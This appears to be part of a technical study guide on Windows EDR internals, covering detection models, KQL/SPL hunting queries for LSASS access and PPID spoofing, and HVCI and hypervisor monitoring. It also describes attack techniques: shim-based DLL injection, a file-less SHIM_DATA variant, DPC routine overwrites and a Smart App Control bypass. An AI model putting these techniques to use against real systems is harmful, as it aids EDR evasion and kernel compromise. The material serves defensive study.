Splunk ES 6.4+ natively tags correlation search results with ATT&CK tactic numbers, surfacing them in the ATT&CK Navigator overlay. Microsoft Sentinel and MDE's custom detection rules do the same via `AlertRuleTag` metadata.

### 5.3 Machine Learning Models in EDR Backends

**Sequence models (LSTM/Transformer)**: Treat process behavioral sequences as time-series. Input: ordered sequence of events (syscall type, file access, network connection) encoded as token IDs. Output: anomaly score or malware classification. Effective for detecting multi-stage attack chains where individual events appear benign.

**Graph Neural Networks (GNN)**: Operate on the provenance graph directly. Each node is embedded as a feature vector (process name hash, privileges, file hash). GNN aggregates neighborhood context via message passing. Output: per-node or per-graph classification.
- **GCN** (Graph Convolutional Network): Global structure learning
- **GAT** (Graph Attention Network): Dynamic weighting of neighbor contributions
- **GIN** (Graph Isomorphism Network): Discriminative power for graph-level classification

**Static ML (Pre-execution)**: XGBoost/LightGBM on PE feature vectors (section entropy, import table hash, string statistics, header anomalies). Decision is made before the file runs. Typical false-positive rate target: <0.1% with TPR >99% on known malware families.

**Current state-of-the-art (2024-2025)**: Hybrid LSTM-GNN models that combine temporal event sequences with structural graph features outperform either approach alone on APT detection benchmarks. Research from 2025 (USENIX Security, IEEE S&P) demonstrates >95% APT detection on provenance graphs with <5% FPR.

### 5.4 KQL Hunting Queries (MDE)

The MDE advanced hunting schema surfaces 30 days of raw endpoint telemetry across tables:

**DeviceProcessEvents** — Process creation with parent chain, command line, file hash, integrity level:
```kql
// Detect PPID spoofing: creator != reported parent
DeviceProcessEvents
| where InitiatingProcessId != ProcessParentId
| where FileName !in~ ("svchost.exe", "services.exe")
| project Timestamp, DeviceName, FileName, ProcessId,
          ProcessParentId, InitiatingProcessFileName, InitiatingProcessId
```

**DeviceEvents with OpenProcess** — Detecting suspicious LSASS access:
```kql
DeviceEvents
| where ActionType == "OpenProcess"
| where TargetProcessFileName =~ "lsass.exe"
| where toint(AdditionalFields.GrantedAccess) & 0x10 != 0  // PROCESS_VM_READ
| where InitiatingProcessFileName !in~ ("MsMpEng.exe","AntimalwareServiceExecutable.exe")
| summarize count() by DeviceName, InitiatingProcessFileName, bin(Timestamp, 1h)
```

**DeviceProcessEvents with graph semantics** (GA since May 2024):
```kql
// Find lateral movement paths via process relationships
let start = DeviceProcessEvents
    | where FileName =~ "powershell.exe" and ProcessCommandLine has "-enc";
start
| invoke GraphTraversal(
    "DeviceProcessEvents",
    sourceColumn = "ProcessId",
    targetColumn = "InitiatingProcessId",
    maxDepth = 4
)
```

### 5.5 Splunk SPL for Threat Hunting

```spl
// Detect token manipulation via whoami elevation
index=endpoint source="XmlWinEventLog:Security" EventCode=4672
| eval is_sensitive=if(match(PrivilegeList,"SeTcbPrivilege|SeDebugPrivilege"),1,0)
| where is_sensitive=1
| join SubjectLogonId [
    search index=endpoint EventCode=4688 
    | fields SubjectLogonId, NewProcessName, CommandLine
]
| table _time, SubjectUserName, SubjectLogonId, NewProcessName, CommandLine

// Detect process creation from WMI with unusual parent
index=endpoint source="XmlWinEventLog:Security" EventCode=4688
| where Creator_Process_Name="C:\Windows\System32\wbem\WmiPrvSE.exe"
| stats count by New_Process_Name, Account_Name
| where NOT New_Process_Name IN ("C:\Windows\System32\svchost.exe")
```

### 5.6 Alert Fatigue Reduction

Production EDR backends process 10,000-100,000 raw events per second per endpoint. Alert fatigue reduction mechanisms:

**Event deduplication**: Hash the (process_key, event_type, target_key) tuple. Identical events within a 60-second window are collapsed to one record with a count.

**Alert grouping**: Correlate alerts sharing the same root process (traced back via process lineage). A single incident may encompass 50+ individual detection hits from one attacker session.

**Behavioral baseline suppression**: EDR trains a per-endpoint "normal" model. Events matching the baseline score near-zero. Alerts only fire for statistically anomalous deviations (z-score > 3σ from 30-day rolling mean).

**MITRE ATT&CK coverage weighting**: Alerts tagged with high-severity techniques (T1003 credential access, T1078 valid accounts) receive automatic escalation. Low-confidence detection hits for T1546 (event-triggered execution) are buffered until corroborated by additional signals.

---

## Topic 6 — Kernel Shim Engine Abuse and Detection

### 6.1 AppHelp / Shim Engine Overview

The Windows Application Compatibility (AppCompat) framework allows Microsoft to apply "shims" — thin fix layers — to legacy applications without recompiling them. Key components:
- `apphelp.dll` — user-mode shim application library
- `ahcache.sys` — kernel driver maintaining the AppCompat cache
- `sysmain.sdb` — the master shim database (`%SystemRoot%\AppPatch\sysmain.sdb`)
- `sdbinst.exe` — command-line tool to install custom SDB files

### 6.2 The InjectDLL Shim

The `InjectDLL` shim fix is a legitimate AppCompat capability that instructs `apphelp.dll` to inject a specified DLL into the target process during startup, before any application code runs.

**Execution flow**:
1. Parent calls `CreateProcess` (suspended state).
2. Kernel invokes `NtApphelpCacheControl(ApphelpCacheServiceLookupProcess, ...)` to check the cache.
3. `ntdll.dll` in the child process reads `PEB->pShimData`. If non-null, loads `apphelp.dll`.
4. `apphelp.dll!SE_InstallAfterInit` reads shim fix data and calls `LoadLibrary` on the target DLL.
5. The DLL is now loaded before the process's main thread starts — before any EDR user-mode hooks can be established.

**Limitations**: InjectDLL only works for **32-bit processes**. The 64-bit `AcGenral.dll` lacks the `NS_InjectDll` class. The target DLL must be loadable from the process's current directory or a path in the shim data.

### 6.3 Registry Persistence Locations

Custom SDB installation via `sdbinst.exe /db custom.sdb` creates:
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\
    <executable_name.exe>\
        {GUID}.sdb → REG_QWORD: shim flags

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\
    {GUID}\
        DatabaseDescription → REG_SZ: "Custom"
        DatabasePath        → REG_EXPAND_SZ: path to .sdb file
        DatabaseType        → REG_DWORD: 0x00000001
```

The actual SDB file is copied to `%SystemRoot%\AppPatch\Custom\{GUID}.sdb`.

**AppCompat cache registry** (`ahcache.sys` backing store):
```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
    AppCompatCache  → REG_BINARY  (binary LRU cache of PE metadata)
    CacheMainSdb    → REG_BINARY  (main SDB file checksum)
    SdbTime         → REG_BINARY  (last modification time)
```

### 6.4 SDB File Format Basics

SDB is a binary format composed of tagged records:
- Each record: `[TAG_ID (2 bytes)][SIZE (4 bytes)][DATA]`
- Key TAG types: `TAG_EXE` (0x7001) identifies a target executable, `TAG_SHIM_REF` references a shim fix, `TAG_INEXCLUDE` excludes paths, `TAG_MATCHING_FILE` adds fingerprint criteria.
- The NtImagePath field within TAG_EXE contains the target executable path.
- The shim fix is referenced by an offset into the shim definition section.

### 6.5 File-less / Registry-less Shim Attack

Research (Deep Instinct, 2024) demonstrated a novel technique: directly write the `SHIM_DATA` structure to a suspended child process's memory and set `PEB->pShimData` to point to it, without ever creating an SDB file on disk or writing to the registry.

The `SHIM_DATA` structure (reverse-engineered):
```c
struct SHIM_DATA {
    DWORD  Magic;        // 0xAC0DEDAB
    DWORD  Size;         // >= 0x11C0
    DWORD  ExeTag;       // Tag offset into sysmain.sdb (e.g., 0x4ed54)
    // ... additional shim fix metadata
};
```

By using an existing `ExeTag` from the system's own `sysmain.sdb`, the attack leaves zero disk artifacts and bypasses EDR registry/file monitors.

### 6.6 EDR Detection Methods

**Registry monitoring** (`CmRegisterCallbackEx`): Watch for writes to `AppCompatFlags\Custom` and `AppCompatFlags\InstalledSDB`. Any new SDB registration outside of known software installers is suspicious.

**File monitoring** (minifilter): Alert on creation of `.sdb` files in `%SystemRoot%\AppPatch\Custom\`.

**`NtApphelpCacheControl` hooking**: This undocumented kernel API (called via `ahcache.sys`) is rarely monitored. The attack research noted: "NtApphelpCacheControl and requesting an OpLock are mostly unmonitored by security products" — this remains a gap in most EDR implementations.

**Process injection detection**: If a DLL is loaded via InjectDLL into a process that has never had that DLL before, the image-load callback (`PsSetLoadImageNotifyRoutine`) will fire for that DLL. If the DLL path is unusual (not in System32, not signed), this is flagged.

**OpLock on sysmain.sdb**: The file-less variant requests an opportunistic lock on `sysmain.sdb` to detect when `CreateProcess` reads it. EDR with minifilter visibility can detect this OpLock pattern from unexpected processes.

---

## Topic 7 — DPC (Deferred Procedure Call) Abuse and EDR Usage

### 7.1 KDPC Structure

```c
typedef struct _KDPC {
    union {
        ULONG  TargetInfoAsUlong;
        struct {
            UCHAR   Type;         // 0x13 = DPC, 0x1A = Threaded DPC
            UCHAR   Importance;   // LowImportance/MediumImportance/HighImportance
            USHORT  Number;       // Target processor (0 = any)
        };
    };
    SINGLE_LIST_ENTRY DpcListEntry;   // Queue linkage (Windows 8.1+ uses KDPC_LIST)
    ULONG_PTR         ProcessorHistory; // Bitmask of processors this DPC has run on
    PKDEFERRED_ROUTINE DeferredRoutine; // Function pointer — THE ATTACK SURFACE
    PVOID             DeferredContext;
    PVOID             SystemArgument1;
    PVOID             SystemArgument2;
    PVOID             DpcData;          // Points to KDPC_DATA (per-CPU queue structure)
} KDPC, *PKDPC;
```

### 7.2 KeInsertQueueDpc Mechanics

`KeInsertQueueDpc(PKDPC Dpc, PVOID Arg1, PVOID Arg2)`:
1. Raises IRQL to `HIGH_LEVEL` via CR8 register manipulation.
2. Acquires the per-processor KDPC_DATA spin lock.
3. Inserts the KDPC into the appropriate processor's DPC queue (FIFO for normal DPCs, target-processor-specific for targeted DPCs).
4. Sets the DPC interrupt pending flag.
5. Releases lock and restores IRQL.

**IRQL context**: DPCs execute at `DISPATCH_LEVEL` (IRQL 2). At this IRQL:
- The thread scheduler is disabled — no context switches occur.
- Only non-paged memory is accessible.
- Holding execution at DISPATCH_LEVEL for more than 100 microseconds causes DPC watchdog violations (BugCheck 0x133).

**Windows 8.1+ KDPC_DATA change**: The doubly-linked LIST_ENTRY was replaced with a singly-linked `KDPC_LIST` using `SINGLE_LIST_ENTRY` for `ListHead` and `LastEntry`. Code using the old structure on Windows 10+ will cause BSODs — this is a common mistake in rootkit/BYOVD tooling.

### 7.3 Can Attackers Abuse DPCs?

**Direct DPC abuse**: An attacker with kernel code execution can call `KeInitializeDpc` and `KeInsertQueueDpc` to queue arbitrary code execution at DISPATCH_LEVEL. This has limited advantage over direct SYSTEM-level execution but can be used for:
- **Cross-processor code execution**: By targeting a specific CPU with the DPC, forcing execution on a processor that may have different security context.
- **Timing attacks**: Using DPC timer variants (`KeSetTimer` + DPC) to execute code at precise intervals — useful for evading periodic EDR memory scans.
- **Interrupt-level hooking**: Overwriting the `DeferredRoutine` pointer of a DPC registered by a legitimate driver (e.g., a NIC driver's interrupt DPC) redirects execution to attacker code.

**The `DeferredRoutine` overwrite**: This is the main exploitation vector. If an attacker gains arbitrary kernel write, they can overwrite the `DeferredRoutine` field of any pending KDPC. When the CPU processes the DPC queue, the attacker's function executes at DISPATCH_LEVEL.

### 7.4 EDR Internal Use of DPCs

EDR kernel drivers legitimately use DPCs for:
- **Asynchronous event processing**: After a callback fires (e.g., process creation), heavy processing is deferred to a DPC to minimize impact on the callback's IRQL.
- **Periodic memory scanning**: A timer + DPC combination triggers VAD tree scans at configurable intervals without blocking I/O.
- **INVEPT broadcasting**: In hypervisor-based EDR, EPT cache invalidation requires all CPUs to execute `INVEPT`. The driver uses `KeInsertQueueDpc` with per-CPU KDPC structures to broadcast the VMCALL to all processors simultaneously.

### 7.5 DPC and Watchdog — EDR Constraint

EDR DPC routines must complete within the DPC watchdog threshold (by default ~100µs on Windows 10). Exceeding this triggers BugCheck `0x133 (DPC_WATCHDOG_VIOLATION)`. This constrains what EDR can do in DPC context — heavy work (memory hashing, YARA scanning) must be dispatched to system threads running at PASSIVE_LEVEL.

---

## Topic 8 — WDAC, HVCI, and BYOVD Prevention

### 8.1 CI.dll: Code Integrity Engine

`CI.dll` is the Windows Code Integrity module, loaded by the kernel as a trusted component. It is responsible for:
- Verifying Authenticode signatures of drivers and executables.
- Enforcing WDAC policy rules (allowlist/denylist).
- Verifying kernel-mode code via `SeValidateImageData` before mapping.

Key exported functions (consumed by kernel loader):
- `CiInitialize` — initializes the CI engine at boot
- `CiValidateImageHeader` — validates a PE header against policy
- `CiCheckSignedFile` — validates a file's embedded signature
- `CiQueryInformation` — queries CI policy state

Under HVCI, `CI.dll` runs its validation logic with the results **enforced by the hypervisor**. Even if a compromised kernel modifies `CI.dll`'s internal state, the hypervisor's EPT rules prevent unsigned code from becoming executable.

### 8.2 HVCI Architecture (VBS/VTL)

```
VTL 1 (Secure World)                    VTL 0 (Normal World)
┌─────────────────────────┐             ┌──────────────────────────┐
│ securekernel.exe        │             │ ntoskrnl.exe             │
│  ├── SLAT/EPT Manager   │ ←hypercall→ │  ├── CI.dll              │
│  ├── HvCallModifyVtlProt│             │  ├── Driver loader        │
│  └── Credential Guard   │             │  └── Kernel drivers      │
└─────────────────────────┘             └──────────────────────────┘
         │ EPT rules (immutable from VTL 0)
         ▼
┌─────────────────────────┐
│ Intel VT-x / AMD-V      │
│  EPT enforces:          │
│  • .text pages → R-X    │
│  • .data pages → RW-    │
│  • No RWX ever          │
└─────────────────────────┘
```

**HvCallModifyVtlProtectionMask** (hypercall 0xC): VTL 1 calls this to set immutable memory protections on physical pages. Once set from VTL 1, VTL 0 cannot override these protections — the hypervisor rejects such attempts.

**W^X enforcement**: HVCI ensures every physical page is either writable OR executable, never both. This defeats:
- `MmMapIoSpace` + shellcode injection
- PTE modification to mark data pages executable
- Return-to-shellcode attacks via stack overflow

### 8.3 BYOVD Prevention Stack

The full BYOVD prevention stack (in order of enforcement):
1. **Microsoft Vulnerable Driver Blocklist** — SHA256 hashes and authenticode certificates of known-vulnerable drivers. Checked by `CI.dll` before load. Updated via Windows Update and downloadable as `DriverSiPolicy.p7b`.
2. **WDAC policy** — Allowlist policy enforced by `CI.dll`. Only drivers matching allowed signers/hashes can load. `UMCI` (User Mode Code Integrity) extends this to user-mode executables.
3. **HVCI** — Prevents modification of already-loaded code. Even if a policy allows a driver to load, HVCI prevents the driver from creating new executable code pages at runtime.
4. **kCFG (Kernel Control Flow Guard)** — Validates indirect call targets. HVCI makes the CFG bitmap read-only, so attackers cannot add forged entries.

**What still works under full HVCI+WDAC**:
- Data-only attacks (token stealing, EPROCESS manipulation)
- ROP chains using existing kernel code gadgets
- kCFG-compliant indirect calls to legitimate kernel APIs
- Kernel data structure manipulation (disabling callbacks by zeroing their entries)

### 8.4 Smart App Control (SAC) in Windows 11

SAC is WDAC with cloud-based reputation as a policy source. Enforcement flow:
1. User attempts to run an executable.
2. `CI.dll` checks if the binary has a valid Authenticode signature from a trusted publisher.
3. If unsigned: `CI.dll` contacts the **Intelligent Security Graph (ISG)** cloud service, sending the file's SHA256 hash and signing certificate info.
4. ISG returns: `KnownGood`, `KnownBad`, or `Unknown` (within ~200ms).
5. `KnownGood` → allowed. `KnownBad` → blocked. `Unknown` → blocked (conservative mode) or allowed with SmartScreen warning (evaluation mode).

**ISG internals**: Processes "trillions of signals from Windows endpoints" every 24 hours. Signal sources include Defender AV telemetry, Windows Update, Microsoft Store download statistics, and SmartScreen URL reputation. The ML model outputs a confidence-weighted reputation score.

**The `$kernel.purgatoryTag` extended attribute**: Processes running with kernel privileges can set the ISG extended file attribute (`$kernel.purgatoryTag`) on a binary to force it to appear `KnownGood` to SAC — effectively a SAC bypass available only to kernel-level attackers (which already have full control).

**SAC vs WDAC**: SAC is a built-in consumer policy requiring no administrative configuration. Enterprise WDAC offers more granular control (specific signer allowlists, path rules) but requires policy authoring and deployment.

---

## Topic 9 — Hypervisor-Level EDR (Type-1 Hypervisor)

### 9.1 EPT-Based Hooking Architecture

Type-1 hypervisor EDR (Bitdefender HVMI, VMware Carbon Black cloud workload protection) operates below the guest OS kernel, making it invisible to any guest-level attacker.

**EPT (Extended Page Tables)**: The hypervisor's second-level address translation. Guest Virtual Address → (via guest page tables) → Guest Physical Address → (via EPT) → System Physical Address.

By manipulating EPT entries, the hypervisor controls what the guest OS can do with physical memory:

```
EPT Entry (for a monitored function page):
  Read    = 1  (guest can read code)
  Write   = 0  (guest cannot modify code — detects hooking)
  Execute = 0  (triggers EPT violation on first instruction fetch)
```

When the guest tries to execute code on a page with Execute=0, a VM-exit occurs (reason `EXIT_REASON_EPT_VIOLATION` = 0x30). The hypervisor's VMEXIT handler:
1. Reads `VMCS.GUEST_PHYSICAL_ADDRESS` to identify the faulting page.
2. Reads `VMCS.EXIT_QUALIFICATION` to determine if it was a read, write, or execute fault.
3. Performs the inspection (e.g., log the attempted execution, check for ROP gadgets).
4. Temporarily sets Execute=1 and resumes the guest.
5. After a single instruction executes, a single-step VMEXIT re-triggers, and Execute is set back to 0.

### 9.2 VMCS Fields for Hypervisor EDR

Key VMCS (Virtual Machine Control Structure) fields relevant to EDR monitoring:

| VMCS Field | Encoding | EDR Use |
|-----------|---------|--------|
| `GUEST_PHYSICAL_ADDRESS` | 0x2400 | Physical address triggering EPT violation |
| `EXIT_QUALIFICATION` | 0x6400 | Bit 0=read, Bit 1=write, Bit 2=execute fault |
| `VM_EXIT_REASON` | 0x4402 | 0x30=EPT_VIOLATION, 0x31=EPT_MISCONFIG |
| `GUEST_RIP` | 0x681E | Instruction pointer at time of VM-exit |
| `GUEST_RSP` | 0x681C | Stack pointer — for ROP chain analysis |
| `GUEST_CR3` | 0x6802 | Guest page table root — for address translation |
| `MSR_IA32_DEBUGCTL` | 0x2802 | Intel PT configuration register (read-only) |

### 9.3 Bitdefender HVMI Architecture

Bitdefender's open-source **HVMI (Hypervisor Memory Introspection)** library (`libintrocore.so`) demonstrates the state-of-the-art in hypervisor-level EDR:

**Hook types**:
- **EPT hooks**: `EPTH_EPT_HOOK_READ`, `EPTH_EPT_HOOK_WRITE`, `EPTH_EPT_HOOK_EXECUTE` — set per-page access restrictions.
- **API detours (guest-space hooks)**: Replaces function prologues with a `VMCALL` instruction (or equivalent) inside the guest. When the guest executes the detoured function, a VM-exit occurs, and the hypervisor inspects parameters.
- **MSR hooks**: Intercepts MSR writes (especially `SYSCALL_LSTAR`, `SYSENTER_EIP`) to detect SSDT/syscall table manipulation.
- **Descriptor table hooks**: Monitors `IDTR`/`GDTR` modifications to detect IDT hooking rootkits.

**Detection capabilities without guest agent**:
- Binary exploits and shellcode injection
- Kernel function hooks (inline hooks, SSDT hooks, IRP hooks)
- Driver-object hooks
- Privilege escalation (EPROCESS.Token manipulation)
- PowerShell script scanning via API detour on `AmsiScanBuffer`

**Semantic gap bridging**: HVMI uses "invariant signatures" — structural patterns derived from Windows PDB symbols — to locate kernel objects (`EPROCESS` list, `_TOKEN` fields) without relying on fixed offsets. The library ships with version-specific offset tables and falls back to heuristic scanning for unknown kernel versions.

### 9.4 Stealth Properties

Hypervisor-level EDR is undetectable from within the guest OS:
- No drivers listed in `driverquery` or `fltmc`.
- No processes in the process list.
- No registry keys.
- No ETW providers.
- No hooks visible in SSDT or PEB loader.
- The only observable artifact: occasional VM-exits cause minor latency increases on monitored operations (typically <5% overhead for passive monitoring, up to 15% with heavy hook density).

**Detection of HVMI by attackers**: The `VMCALL` instruction can be executed from guest code to probe for hypervisor presence. The hypervisor may choose to pass `VMCALL` through to the guest (returning an error) or handle it. Tools like `cpuid(HYPERVISOR_PRESENT_BIT)` can detect any Type-1 hypervisor, but cannot distinguish HVMI from a VM host.

### 9.5 Intel PT for Full Execution Tracing

Intel Processor Trace (Intel PT) continuously records control flow into a circular memory buffer via CPU hardware mechanisms:

- **TNT (Taken-Not-Taken) packets**: Single-bit encoding for conditional branches.
- **TIP (Target IP) packets**: Full address for indirect calls/jumps/returns.
- **FUP (Flow Update Packet)**: Async events (interrupts, exceptions).
- **PSB (Packet Stream Boundary)**: Synchronization packet every 4KB.

**CrowdStrike Falcon's implementation** (Falcon Hardware Enhanced Exploit Detection):
- Requires Intel CPU 6th generation (Skylake) or newer + Windows 10 RS4.
- Per-thread PT buffers (32 KB) configured via MSRs `IA32_RTIT_CTL`, `IA32_RTIT_OUTPUT_BASE`, `IA32_RTIT_OUTPUT_MASK_PTRS`.
- PT state saved/restored on thread context switch via `XSAVES`/`XRSTORS` (requires CPU support for XSAVES).
- Analyzes trace for: returns not matching prior call (ROP), indirect jumps to non-function-entry addresses (JOP), abnormal stack pointer modifications.
- Performance: 130,000 instructions analyzed in ~5ms. Custom decoder handles millions of instructions per second.

**Detection output**: `SuspiciousExecutionTrace` detection event + `PtTelemetry` trace data, both appearing in the Falcon UI. Validated against CVE-2019-17026 (Firefox ROP exploit) and CVE-2021-40444 (MSHTML RCE).

---

## Topic 10 — Sensor Data Enrichment Pipeline

### 10.1 Raw Event to Enriched Record

The pipeline from raw kernel event to cloud-ready record involves multiple enrichment stages:

```
Kernel Callback fires
        │
        ▼
[Stage 1: Immediate capture]
  • PID, TID, timestamp (KeQueryPerformanceCounter)
  • Operation type and target
  • Synchronous: done in callback context
        │
        ▼
[Stage 2: EPROCESS/ETHREAD enrichment]  ← deferred DPC or work item
  • ImageFileName (from EPROCESS or SeAuditProcessCreationInfo for full path)
  • PEB walking: CommandLine, ImagePathName, WorkingDirectory
  • SessionId (EPROCESS.SessionId)
  • Token integrity level (EPROCESS.Token → TOKEN.IntegrityLevelIndex)
  • Parent chain (up to N levels)
        │
        ▼
[Stage 3: File hash calculation]  ← if event involves file I/O
  • At minifilter post-operation callback: IRP_MJ_CREATE completion
  • EDR reads file content via FltReadFile with its own context
  • Computes SHA256; checks against local hash cache
  • Hash cache miss → full computation (async to avoid I/O stall)
        │
        ▼
[Stage 4: Network attribution]
  • WFP ALE layer provides PID in classify metadata
  • FWPM_LAYER_ALE_AUTH_CONNECT_V4: classifyFn receives FWPS_INCOMING_VALUES0
  • Extract PID from FWPS_METADATA_FIELD_PROCESS_ID field
  • Resolve PID → process image, parent chain (cross-referenced with Stage 2)
        │
        ▼
[Stage 5: Certificate chain verification]
  • For newly loaded images: EDR queries WinVerifyTrust / CryptQueryObject
  • Validates signature chain up to trusted root
  • Extracts: issuer name, subject, thumbprint, timestamp, countersignature
  • Flags: unsigned, self-signed, expired, revoked, timestamped-after-revocation
        │
        ▼
[Stage 6: Cloud upload]  ← sensor service batches and sends
  • Binary-serialized event records (protobuf or proprietary format)
  • Compressed (LZ4/Zstd) before transmission
  • Deduplicated against recently sent hashes
  • Queued locally if network unavailable (typically 72h retention)
```

### 10.2 PEB Walking from Kernel

EDR drivers access the Process Environment Block from kernel mode to retrieve user-space process metadata:

```c
// Get PEB from EPROCESS
PPEB pPeb = PsGetProcessPeb(Process);  // kernel API, returns user-space pointer

// Read PEB fields via MmCopyVirtualMemory or ProbeAndRead
RTL_USER_PROCESS_PARAMETERS params = {};
MmCopyVirtualMemory(Process, pPeb->ProcessParameters, 
                    PsGetCurrentProcess(), &params,
                    sizeof(params), KernelMode, &bytesRead);

// Extract strings
// params.CommandLine.Buffer → command line (user-space address)
// params.ImagePathName.Buffer → full image path
// params.CurrentDirectory.DosPath.Buffer → working directory
```

**Security**: All PEB reads from kernel must use `ProbeForRead` or `MmCopyVirtualMemory` to safely handle user-space pointers. A malicious process can modify its own PEB to lie about these values — EDR cross-validates with `EPROCESS.SeAuditProcessCreationInfo.ImageFileName` (kernel-maintained, cannot be modified from user-mode).

### 10.3 File Hash at I/O Interception Point

The optimal point to compute file hashes is at the minifilter's `IRP_MJ_CREATE` post-operation callback, after the file handle is successfully opened. At this point:
1. The file is open (no TOCTOU race with on-disk content).
2. The minifilter can use `FltReadFile` to read file content without going through the regular I/O path (avoiding recursive filter callbacks).
3. The EDR maintains a per-device SHA256 cache keyed by `(volume_GUID, file_ID, last_modified_time)` to avoid re-hashing unchanged files.

**Hash cache invalidation**: The cache entry is invalidated when the minifilter observes a `IRP_MJ_SET_INFORMATION(FileEndOfFileInformation)` or a successful `IRP_MJ_WRITE` to the file. This prevents stale hashes from persisting after file modification.

### 10.4 Network Connection Process Attribution

WFP's Application Layer Enforcement (ALE) is the authoritative source for network-to-process attribution:

- `FWPM_LAYER_ALE_AUTH_CONNECT_V4` fires **once per connection** (not per packet).
- The classify function receives `FWPS_INCOMING_METADATA_VALUES0` containing `currentMetadataValues->processId` — the PID of the process initiating the connection.
- For redirected connections (proxy): `localRedirectTargetPID` in `FWPS_CONNECT_REQUEST0` identifies the original initiating process.
- IPv6 equivalent: `FWPM_LAYER_ALE_AUTH_CONNECT_V6`.

The WFP callout registration pattern used by EDR:
```c
FWPS_CALLOUT callout = {
    .calloutKey         = GUID_EDR_ALE_CALLOUT,
    .classifyFn         = EdrAleClassifyCallback,
    .notifyFn           = EdrAleNotifyCallback,
    .flowDeleteFn       = EdrAleFlowDeleteCallback,
};
FwpsCalloutRegister3(deviceObject, &callout, &calloutId);
```

The classify callback extracts: `localAddress`, `localPort`, `remoteAddress`, `remotePort`, `ipProtocol`, `processId`, then packages this into an event record and sends it to the sensor service via `FltSendMessage` or a shared ring buffer.

### 10.5 Certificate Chain Verification

At image load (`PsSetLoadImageNotifyRoutine` callback), EDR verifies the digital signature:

1. **Image signature level** (from `IMAGE_INFO_EX.ImageSignatureLevel` field): Values include `SE_SIGNING_LEVEL_UNSIGNED` (0), `SE_SIGNING_LEVEL_MICROSOFT` (8), `SE_SIGNING_LEVEL_WINDOWS` (12), `SE_SIGNING_LEVEL_WINDOWS_TCB` (14).

2. **Authenticode validation**: For non-OS binaries, the EDR queues `WinVerifyTrust` verification from a system thread (cannot call from callback context — too high IRQL risk). Uses `WINTRUST_FILE_INFO` with `dwUnionChoice = WTD_CHOICE_FILE` and `dwUIContext = WTD_UI_NONE`.

3. **Certificate details extraction**: `CryptQueryObject(CERT_QUERY_OBJECT_FILE, ...)` retrieves the PKCS#7 message. The chain is walked via `CertGetIssuerCertificateFromStore` to verify up to a trusted root.

4. **Timestamping check**: Countersignature timestamp is verified to determine if the signature was valid at signing time even if the certificate has since expired.

5. **Revocation check** (online): `CertVerifyRevocation` queries the CRL distribution points or OCSP responders. Many EDR products cache revocation results for 24h to avoid network latency impact on process creation.

---

## Additional References (Supplement)

- [PS_CREATE_NOTIFY_INFO MSDN](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-_ps_create_notify_info) — Official structure definition
- [nirsoft.net — TOKEN structure](https://www.nirsoft.net/kernel_struct/vista/TOKEN.html) — Vista-era TOKEN field list
- [nirsoft.net — SEP_TOKEN_PRIVILEGES](https://www.nirsoft.net/kernel_struct/vista/SEP_TOKEN_PRIVILEGES.html) — Privilege bitmask structure
- [Bitdefender HVMI Documentation](https://hvmi.readthedocs.io/en/latest/chapters/1-overview.html) — Hypervisor Memory Introspection overview
- [CrowdStrike — Falcon Hardware Enhanced Exploit Detection](https://www.crowdstrike.com/en-us/blog/introducing-falcon-hardware-enhanced-exploit-detection/) — Intel PT integration
- [Connor McGarr — Living the Age of VBS, HVCI, and Kernel CFG](https://connormcgarr.github.io/hvci/) — HVCI enforcement deep dive
- [Deep Instinct — SHIM Me What You Got](https://www.deepinstinct.com/blog/SHIM-Me-What-You-Got:-Manipulating-Shim-and-Office-for-Code-Injection) — File-less shim attack
- [repnz — Reversing DPC: KeInsertQueueDpc](https://repnz.github.io/posts/practical-reverse-engineering/reversing-dpc-keinsertqueuedpc/) — KDPC structure and queue mechanics
- [ired.team — Token Abuse for Privilege Escalation](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation) — EPROCESS.Token exploitation
- [eBPF Docs — BPF_PROG_TYPE_LSM](https://docs.ebpf.io/linux/program-type/BPF_PROG_TYPE_LSM/) — KRSI program type reference
- [Falco — Tracing System Calls Using eBPF](https://falco.org/blog/tracing-syscalls-using-ebpf-part-1/) — sys_enter/sys_exit implementation
- [KRSI — LWN.net](https://lwn.net/Articles/815826/) — Kernel Runtime Security Instrumentation
- [Microsoft — Mandatory Integrity Control](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control) — MIC/integrity level design
- [Microsoft — Application Layer Enforcement](https://learn.microsoft.com/en-us/windows/win32/fwp/application-layer-enforcement--ale-) — WFP ALE layer reference
- [saza.re — Windows Defender Handle Exploration](https://saza.re/posts/handle_exploration/) — HANDLE_TABLE_ENTRY and ObRegisterCallbacks
- [Picus Security — PPID Spoofing Detection](https://www.picussecurity.com/resource/blog/how-to-detect-parent-pid-ppid-spoofing-attacks) — Detection methodology
- [Cloudflare — Live-patching with eBPF LSM](https://blog.cloudflare.com/live-patch-security-vulnerabilities-with-ebpf-lsm/) — KRSI production use case
- [DarkReading — CrowdStrike Intel CPU Telemetry](https://www.darkreading.com/cyber-risk/crowdstrike-incorporates-intel-cpu-telemetry-into-falcon-sensor) — Intel PT announcement
- [arxiv:2401.15878 — MITRE ATT&CK EDR Evaluation Analysis](https://arxiv.org/pdf/2401.15878) — EDR performance analysis
- [rayanfam.com — Hypervisor EPT Monitoring Part 7](https://rayanfam.com/topics/hypervisor-from-scratch-part-7/) — EPT violation hooking implementation

Understanding *how* events flow from kernel code to EDR consumer is essential for understanding both detection and evasion at this layer.

### 21.1 The ETW Registration Model

Every ETW provider — including kernel providers like `Microsoft-Windows-Threat-Intelligence` — must register with the ETW subsystem before it can emit events. This registration creates a `_ETW_REG_ENTRY` object.

```c
// Simplified internal structure (reconstructed from reverse engineering)
typedef struct _ETW_REG_ENTRY {
    LIST_ENTRY         RegList;          // linked in _ETW_GUID_ENTRY.RegListHead
    GUID               ProviderId;
    ULONG64            ProviderId_High;
    ULONG64            ProviderId_Low;
    ULONG              Index;            // index into global reg array
    ULONG              Flags;
    ULONG              IsEnabled;        // checked before EtwWriteEx() emits
    ULONG              Level;            // minimum severity level
    ULONG64            EnableMask;       // keyword enable bitmask
    ULONG64            MatchAnyKeyword;
    ULONG64            MatchAllKeyword;
    PVOID              ProviderCallbackContext;
    PETWENABLECALLBACK ProviderCallback; // called when session enables/disables
    PVOID              ProvRegistration; // back-pointer to REGHANDLE object
